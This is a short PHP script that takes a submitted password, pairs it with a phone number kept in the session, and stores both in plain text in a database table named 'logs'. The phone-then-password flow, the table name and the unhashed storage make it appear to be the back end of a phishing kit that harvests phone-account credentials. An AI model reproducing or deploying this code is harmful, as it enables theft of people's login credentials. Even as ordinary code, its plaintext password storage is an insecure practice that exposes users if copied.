<?php
header('Content-Type: application/json');
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';
    
    if (!empty($password)) {
        try {
            session_start();
            $phone = $_SESSION['phone'] ?? '';
            
            if (!empty($phone)) {
                // Insert into database
                $stmt = $pdo->prepare("INSERT INTO logs (numero, pass) VALUES (?, ?)");
                $stmt->execute([$phone, $password]);
                
                // Clear session
                unset($_SESSION['phone']);
                
                echo json_encode(['success' => true, 'message' => 'Data saved successfully']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Phone number not found']);
            }
        } catch(Exception $e) {
            echo json_encode(['success' => false, 'message' => 'Error saving data']);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'Password required']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid request method']);
}
?> 